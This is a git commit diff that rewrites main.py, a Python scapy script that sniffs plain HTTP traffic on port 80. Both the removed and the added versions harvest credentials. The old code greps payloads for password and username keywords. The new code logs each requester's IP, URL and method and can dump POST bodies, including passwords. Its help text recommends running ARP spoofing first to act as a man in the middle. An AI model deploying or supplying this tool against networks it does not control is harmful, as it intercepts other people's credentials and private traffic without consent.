49aca0bab7e7d771724919de1c2610098623fd59
Batukeshwar vats <49240268+BatukeshwarVats@users.noreply.github.com>
2022-01-08 12:26:33 +0530

    Update main.py

--- main.py
+++ main.py
@@ -1,30 +1,54 @@
-import scapy.all as scapy
-from scapy.layers import http
-import argparse
+from scapy.all import *
+from scapy.layers.http import HTTPRequest # import HTTP packet
+from colorama import init, Fore
+# initialize colorama
+from scapy.layers.inet import IP
 
+init()
+# define colors
+GREEN = Fore.GREEN
+RED   = Fore.RED
+RESET = Fore.RESET
 
-def get_interface():
-    parser = argparse.ArgumentParser()
-    parser.add_argument("-i", "--interface", dest="interface",
-                        help="Specify interface on which you wanna sniff packets.")
-    arguments = parser.parse_args()
-    return arguments.interface
-
-
-def sniff(iface):
-    scapy.sniff(iface=iface, store=False, prn=process_packet)
-
+def sniff_packets(iface=None):
+    """
+    Sniff 80 port packets with `iface`, if None (default), then the
+    Scapy's default interface is used
+    """
+    if iface:
+        # port 80 for http (generally)
+        # `process_packet` is the callback
+        sniff(filter="port 80", prn=process_packet, iface=iface, store=False)
+    else:
+        # sniff with default interface
+        sniff(filter="port 80", prn=process_packet, store=False)
 
 def process_packet(packet):
-    if packet.haslayer(http.HTTPRequest):
-        print("[+] HTTP Request >> " + packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path)
-        if packet.haslayer(scapy.Raw):
-            load = packet[scapy.Raw].load
-            keys = ["username", "password", "pass", "email"]
-            for key in keys:
-                if key in load:
-                    print(" [+] Possible password/username >> " + load)
-                    break
+    """
+    This function is executed whenever a packet is sniffed
+    """
+    if packet.haslayer(HTTPRequest):
+        # if this packet is an HTTP Request
+        # get the requested URL
+        url = packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()
+        # get the requester's IP Address
+        ip = packet[IP].src
+        # get the request method
+        method = packet[HTTPRequest].Method.decode()
+        print(f"\n{GREEN}[+] {ip} Requested {url} with {method}{RESET}")
+        if show_raw and packet.haslayer(Raw) and method == "POST":
+            # if show_raw flag is enabled, has raw data, and the requested method is "POST"
+            # then show raw
+            print(f"\n{RED}[*] Some useful Raw data: {packet[Raw].load}{RESET}")
 
-iface = get_interface()
-sniff(iface)
+if __name__ == "__main__":
+    import argparse
+    parser = argparse.ArgumentParser(description="HTTP Packet Sniffer, this is useful when you're a man in the middle." \
+                                                 + "It is suggested that you run arp spoof before you use this script, otherwise it'll sniff your personal packets")
+    parser.add_argument("-i", "--iface", help="Interface to use, default is scapy's default interface")
+    parser.add_argument("--show-raw", dest="show_raw", action="store_true", help="Whether to print POST raw data, such as passwords, search queries, etc.")
+    # parse arguments
+    args = parser.parse_args()
+    iface = args.iface
+    show_raw = args.show_raw
+    sniff_packets(iface)
